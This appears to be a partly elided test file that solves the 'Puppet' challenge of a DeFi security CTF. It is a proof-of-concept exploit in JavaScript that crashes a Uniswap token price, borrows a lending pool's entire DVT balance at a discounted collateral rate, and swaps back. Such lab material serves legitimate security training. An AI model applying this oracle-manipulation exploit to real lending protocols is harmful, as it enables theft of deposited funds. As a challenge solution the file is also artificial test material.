...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The POC here is regarding price oracle manipulation.
     */
    // approving uniswap exchange to use DVT tokens
    await this.token
      .connect(attacker)
    ...
    const minEth = calculateTokenToEthInputPrice(
      ...
      .mul(ethers.BigNumber.from("9"))
      .div(ethers.BigNumber.from("10"));

    const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;

    // exchanging DVT for ~9 ETH
    await this.uniswapExchange
      .connect(attacker)
      .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, minEth, deadline);

    const requiredCollateral = await this.lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    // borrowing DVT at discounted price
    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: requiredCollateral });

    const ethToSold = await this.uniswapExchange.getEthToTokenOutputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      { gasLimit: 1e6 }
    );

    // back to initial balances
    await this.uniswapExchange
      .connect(attacker)
      .ethToTokenSwapOutput(ethToSold, deadline, {
        value: ethToSold,
      });
  });
